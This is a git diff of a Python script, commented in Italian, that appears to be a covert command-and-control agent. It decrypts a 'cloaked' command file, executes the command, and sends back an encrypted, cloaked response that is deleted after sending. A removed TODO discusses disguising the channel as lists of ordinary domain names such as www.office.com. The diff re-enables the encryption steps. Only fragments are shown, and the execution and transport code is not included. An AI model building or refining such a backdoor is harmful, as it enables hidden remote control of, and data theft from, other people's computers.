@@ -35,9 +35,9 @@ def receive_command():
     # Decrypt command
     with open(decloaked_command, 'r') as file:
         encrypted_command = file.read().strip()
-    print("encrypted_command: ", encrypted_command)
-    command = encrypted_command#decrypt_message(encrypted_command, key)
-    
+    #print("encrypted_command: ", encrypted_command)
+    command = decrypt_message(encrypted_command, key)
+    print('received command: '+ command)
     
     # Eseguire il comando
     try:
@@ -56,7 +56,7 @@ def receive_command():
 
 def send_response(response):
     # Cifra la risposta
-    encrypted_response = response#encrypt_message(response, key)
+    encrypted_response = encrypt_message(response, key)
 
     # Cloakificare la risposta
     cloaked_response = "cloaked_response.txt"
@@ -73,16 +73,6 @@ def send_response(response):
     # Rimuove il file di risposta dopo l'invio
     os.remove(cloaked_response)
 
-#DA FIXXARE: se appare un dominio già visto viene rimosso, ma dovrebbe essere rimosso solo e 
-# soltanto se appare di seguito:
-# es. 
-#www.office.com
-#www.office.com -> deve essere rimosso 
-# ma non 
-#www.office.com
-#www.groupon.com
-#www.target.com
-#www.office.com -> non deve essere rimosso
 
 
 if __name__ == "__main__":
